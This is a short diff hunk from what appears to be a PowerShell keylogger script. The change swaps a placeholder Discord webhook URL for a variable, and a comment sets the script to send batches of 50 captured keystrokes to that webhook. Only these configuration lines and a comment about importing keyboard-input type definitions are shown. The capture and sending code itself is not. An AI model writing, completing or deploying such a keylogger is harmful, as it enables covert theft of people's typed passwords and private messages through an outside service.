@@ -13,7 +13,7 @@ USAGE
 #>
 
 # User Setup
-$hookurl = "DICORD_WEBHOOK_HERE"
+$hookurl = "$dc"
 $Amount = 50  #Change this value to the amount of keys to save before sending to the webhook.
 
 # Import TypeDefinitions for keyboard inputs
